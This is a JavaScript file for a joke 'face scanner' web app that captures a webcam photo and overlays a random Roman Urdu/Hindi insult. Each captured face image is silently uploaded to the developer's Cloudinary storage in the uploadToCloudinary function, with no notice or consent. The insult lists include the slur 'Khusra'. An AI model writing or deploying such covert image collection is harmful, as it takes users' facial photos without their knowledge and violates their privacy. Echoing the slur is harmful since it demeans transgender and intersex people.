// --- 0. CLOUDINARY INTEGRATION (Aamir's Free Storage) ---
const cloudName = "dy4kgfvpw";
const uploadPreset = "faceometer_preset"; 

// --- 1. MODES DATA (COMPLETE LIST - NO CUTS) ---
const modes = [
    {
        id: 'placeholder',
        name: '--- Select a Mode ---',
        styleClass: 'placeholder-style',
        comments: []
    },
    {
        id: 'roasting-king',
        name: '😈 The Roasting King (Heavy but Safe)',
        styleClass: 'roast-style',
        comments: [
            "SCAN FAILURE: Screen toot jayegi, itna ghoor ke mat dekho! 💔 Ghoorna band karo!", 
            "ERROR 404: Teri battery low hai, charge ho kar aa 😂",
            "Tum to fazool insan ho mery dost.",
            "Tumhari selfie is waqt duniya ka 8th ajooba hai.",
            "Apny kaam se kaam rakh, chal nikal yahan se 😂",
            "System Error: Aap scan nahi ho paye shakal ki wajah se! 😩",
            "Alert: Shakal pe 'Out of Stock' ka board laga hua hai. Refresh karna bhi bekaar hai! 🚫",
            "Sonay k baad jaldi utha kar, tere laitnay se bed bhi tang ho jata hai ⏰",
            "Mehnat karta reh, aik din khud haar maan jao ge 😂",
            "Tumhari soch ghatiya soch hai",
            "Chal hat oye pagal insan!",
            "Tumhara internet connection tumhare dimagh se zyada tez hai. Sad but true. 💡",
            "Next time try karna. Abhi toh 'Error 404 Not Found' hai! 💀",
            "Tumhari shakal dekh kar kal raat darawna khwab aaya tha. Shakal chupa lo. 👻",
            "Bhaag ja yahan se bandar k mun waly. 😂",
            "System Crash: Mun dho kar aa, phir scan kar ☣️",
            "Same like gadha! 😁",
            "Koi bhi tumhen dekh kar dar jaye ga! 🤔",
            "Zyada smart banne ki koshish mat karo, system janta hai tum copy karte ho. 📝",
            "Aap ko nayi shakal ki zarurat hai 😭",
            "Kam soya kar. Ab tera Brain freeze hogaya! 🥶",
            "Subah ho gayi, uth jao! Tumhary mun pe har waqt 12 q bajy rehty hain?",
            "Hahaha: Tum asliyat mein gadhy jesy ho 😵‍💫",
            "Tumhari khamoshi bhi bahut zyada shor machati hai. Chup raho! 🤫",
            "Jab tum bolty ho, samny wala tauba karta hai, chup raha kar! 😵",
            "Aik number ka ghatiya insan hai tu ⏳",
            "Tu or bandar twins ho kiya? Shakal milti hai tum dono ki 🧐",
            "Chal hat, shaitan k chahchu! 😈",
            "Aapka style purana ho chuka hai, update karo apny aap ko! 💇",
            "Next time filter lagana, baghair filter wali shakal dekh kar dar lagta hai🤦",
            "Tumhary ilawa ghar me or kia cheez faltu hai?",
            "Tumhara bank balance aur tumhari akal dono he gir gaye hain stupid insan. 📉",
            "Tumhara dimagh itna slow chalta hai ki 2G internet bhi tumse tez hai. 🐌",
            "Tery mun ko dekh kar me dar gaya hun yar, sorry bolo mujhy ab 😉",
            "Ye kon hai jis ko dekh kar computer bhi dar gaya 🤣",
            "Tu online na aaya kar, internet band ho jata hai sab ka 😊",
            "SHAME SHAME: Roz subah nahaate nahi ho, ye system janta hai. Chupao mat! 🚿",
            "BATH ALERT: Kabhi to naha liya kar yar!",
            "CRINGE: Tumhari baatein aur tumhari harkatein, dono hi out of date hain. Update karo! 💾",
            "Chal bhaag yahan se, pehly he fazool admi hai tu or ab roast karwany aa gaya 👽",
            "Tumhe khud nahi pata tum kya ho aur kya karna hai. Confused! 🤔",
            "Tumhari jitni tareef ki jaye utni kam hai 🤣",
            "Tu khamosh raha kar, bola na kar",
        ]
    },
    {
        id: 'hyper-burner',
        name: '🔥 Hyper Burner (Short & Explosive Roasts)',
        styleClass: 'burner-style',
        comments: [
            "Shakal achhi lag rahi hai, (me ne jhoot bola hai)!",
            "Mood off hai? Naha ke aao.",
            "Waqt barbaad mat karo. Kuch kaam karo.",
            "Subah ho gayi, uth jao! Sote rehte ho.",
            "Jhoot bolna band karo. Jhoot bol bol kar thakty nahi ho?",
            "Kam khaya karo 😋.",
            "Shakal se toh nahi lagta... tum insaan ho?",
            "Single he rahoge. Kyun? Khud socho.",
            "Kitni der lagayi taiyar hone mein? Phir bhi cheela hua kareela lag rahy ho...",
            "Aaina dekha hai? Nahi dekhna, warna wo bhi dar jayega.",
            "Abey tu insan hai, lagta to nahi 😂",
            "ERROR 99: Dost kam hain? Reason tum khud ho 🤣",
            "Tum jab gussa hoty ho, samny waly ko hansi aa jati hai.",
            "Tumhara dimagh slow chalta hai. Restart karo.",
            "Fazool insan 😂",
            "Tujhy to koi party me bhi invite nahi karta 😉",
            "Apny kapry pehna karo, aaj bhi kisi se maang kar pehny hain 😁",
            "Tumhari jitni tareef ki jaye utni kam hai 🤣",
            "Koi teri izat q kary ga?",
            "Bhoot lag rahe ho. Bhaag jao yahan se 😘",
            "Rating 0/10. Next time aana."
        ]
    },
    {
        id: 'ultimate-destroyer',
        name: '💣 Ultimate Destroyer (One-Word Kill Shots)',
        styleClass: 'destroyer-style',
        comments: [
            "FAIL", "MAD", "Donkey", "GADHE KAHIN K", "Monkey", 
            "Bekar Admi", "Ullu kahin k", "PAGAL", "Khusra 😂",
            "LAZY", "Bhoot", "STRESS", "BROKE", "SINK", 
            "SLEEPY", "SLOW", "CRAZY", "Faltu Banda", "Chal hat",
            "Shaitan", "Gadhi kahin ki", "BEWAQOOF", "Sust Insan", "LAZY"
        ]
    }
];

// --- 2. ELEMENT REFERENCES & STATE ---
let currentMode = modes[0]; 
let videoStream = null;

const modesScreen = document.getElementById('modes-screen');
const scanScreen = document.getElementById('scan-screen');
const resultScreen = document.getElementById('result-screen');
const modeSelect = document.getElementById('mode-select');
const startScanBtn = document.getElementById('start-scan-btn');

const videoElement = document.getElementById('videoElement');
const capturedCanvas = document.getElementById('capturedCanvas');
const timerDisplay = document.getElementById('timer-display');
const newScanBtn = document.getElementById('new-scan-btn');
const backToModesBtn = document.getElementById('back-to-modes-btn');
const resultDisplayFrame = document.querySelector('.result-display-frame'); 

// --- 3. CLOUDINARY UPLOAD FUNCTION ---
async function uploadToCloudinary(imageBlob) {
    const formData = new FormData();
    formData.append('file', imageBlob);
    formData.append('upload_preset', uploadPreset);
    formData.append('tags', 'scans');

    try {
        const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
            method: 'POST',
            body: formData
        });
        const data = await response.json();
    } catch (error) {
        console.error("Cloudinary Error:", error);
    }
}

// --- 4. CORE FUNCTIONS ---

function switchScreen(targetId) {
    if (resultDisplayFrame) { resultDisplayFrame.classList.remove('active'); }
    [modesScreen, scanScreen, resultScreen].forEach(screen => { screen.classList.remove('active'); });
    document.getElementById(targetId).classList.add('active');
    if (targetId !== 'scan-screen') { stopCamera(); }
}

function stopCamera() {
    if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
        videoStream = null;
    }
}

function startScan() {
    if (currentMode.id === 'placeholder') {
        alert("Please select a scan protocol!");
        return;
    }
    const scannerLine = document.querySelector('.real-scanner-line');
    scannerLine.style.animation = 'none';
    void scannerLine.offsetWidth; 
    scannerLine.style.animation = 'realScan 1.5s linear infinite alternate'; 

    switchScreen('scan-screen');
    let scanDuration = 3; 
    timerDisplay.textContent = scanDuration;
    
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            videoStream = stream;
            videoElement.srcObject = stream;
            videoElement.onloadeddata = () => { 
                const timerInterval = setInterval(() => {
                    scanDuration--;
                    timerDisplay.textContent = scanDuration;
                    if (scanDuration <= 0) {
                        clearInterval(timerInterval);
                        videoElement.onloadeddata = null; 
                        setTimeout(captureAndShowResult, 100); 
                    }
                }, 1000);
            };
        })
        .catch(err => {
            alert("SYSTEM ERROR: Camera access denied!");
            switchScreen('modes-screen');
        });
}

function captureAndShowResult() {
    const context = capturedCanvas.getContext('2d');
    capturedCanvas.width = videoElement.videoWidth;
    capturedCanvas.height = videoElement.videoHeight;
    
    if (capturedCanvas.width > 10 && capturedCanvas.height > 10) {
        context.save();
        context.scale(-1, 1);
        context.drawImage(videoElement, capturedCanvas.width * -1, 0, capturedCanvas.width, capturedCanvas.height);
        context.restore(); 

        capturedCanvas.toBlob((blob) => { uploadToCloudinary(blob); }, 'image/jpeg', 0.8);
        
        stopCamera(); 
        const selectedMode = currentMode;
        const randomIndex = Math.floor(Math.random() * selectedMode.comments.length);
        
        let rawComment = selectedMode.comments[randomIndex];
        const finalComment = rawComment.replace(/Roast Level \d+:/g, '').trim();

        // FULL BOX DYNAMIC TERMINAL CALL
        typeEffectOnCanvas(finalComment);
    } else {
        stopCamera();
        switchScreen('modes-screen');
    }
    
    switchScreen('result-screen');
    setTimeout(() => { if (resultDisplayFrame) resultDisplayFrame.classList.add('active'); }, 50); 
}

// --- PROFESSIONAL STEALTH TERMINAL TYPING EFFECT ---
function typeEffectOnCanvas(fullText) {
    const context = capturedCanvas.getContext('2d');
    const canvasWidth = capturedCanvas.width;
    const canvasHeight = capturedCanvas.height;
    
    // LIST OF HEAVY PROFESSIONAL COLORS
    const heavyColors = ["#ff3b3b", "#3bf7ff", "#faff3b", "#ff3bf3", "#3bff5a", "#ffffff"];
    const randomColor = heavyColors[Math.floor(Math.random() * heavyColors.length)];
    
    const isMobile = window.innerWidth < 600;
    
    // FONT SIZE: Big for mobile visibility
    let fontSize = isMobile ? (canvasWidth > 500 ? 48 : 42) : 34;
    if (fullText.length > 80) fontSize -= 6; 

    // NO GLOW - Sharp Terminal Font
    context.font = `900 ${fontSize}px 'Orbitron', sans-serif`;
    
    const words = fullText.toUpperCase().split(" ");
    let wordIndex = 0;
    let currentText = "";

    // Store clean background for redraw
    const offscreenCanvas = document.createElement('canvas');
    offscreenCanvas.width = canvasWidth;
    offscreenCanvas.height = canvasHeight;
    offscreenCanvas.getContext('2d').drawImage(capturedCanvas, 0, 0);

    function drawFrame() {
        if (wordIndex < words.length) {
            currentText += (wordIndex === 0 ? "" : " ") + words[wordIndex];
            wordIndex++;

            context.clearRect(0, 0, canvasWidth, canvasHeight);
            context.drawImage(offscreenCanvas, 0, 0);

            // Darken screen for terminal look
            context.fillStyle = 'rgba(0, 0, 0, 0.7)'; 
            context.fillRect(0, 0, canvasWidth, canvasHeight);

            const currentLines = getLines(context, currentText, canvasWidth * 0.9);
            const lineHeight = fontSize * 1.4;
            
            context.textAlign = 'center';
            context.textBaseline = 'middle';
            
            let startY = (canvasHeight / 2) - ((currentLines.length - 1) * lineHeight / 2);

            currentLines.forEach((line, idx) => {
                // Heavy Sharp Stroke (No Glow)
                context.strokeStyle = "black";
                context.lineWidth = 12; 
                context.strokeText(line, canvasWidth / 2, startY + (idx * lineHeight));
                
                // Solid Heavy Color
                context.fillStyle = randomColor;
                context.shadowBlur = 0; // Removing Glow
                context.fillText(line, canvasWidth / 2, startY + (idx * lineHeight));
            });
            
            setTimeout(drawFrame, 75); 
        }
    }
    drawFrame();
}

function getLines(ctx, text, maxWidth) {
    const words = text.split(" ");
    let lines = [];
    let currentLine = words[0] || '';
    for (let i = 1; i < words.length; i++) {
        const word = words[i];
        const width = ctx.measureText(currentLine + " " + word).width;
        if (width < maxWidth) { currentLine += " " + word; } 
        else { lines.push(currentLine); currentLine = word; }
    }
    lines.push(currentLine);
    return lines;
}

// --- 5. EVENT LISTENERS & INIT ---
modeSelect.addEventListener('change', (e) => {
    currentMode = modes.find(m => m.id === e.target.value);
});
startScanBtn.addEventListener('click', startScan);
newScanBtn.addEventListener('click', startScan);
backToModesBtn.addEventListener('click', () => {
    modeSelect.value = 'placeholder';
    switchScreen('modes-screen');
});
document.addEventListener('DOMContentLoaded', () => {
    modes.forEach(mode => {
        const option = document.createElement('option');
        option.value = mode.id;
        option.textContent = mode.name;
        modeSelect.appendChild(option);
    });
});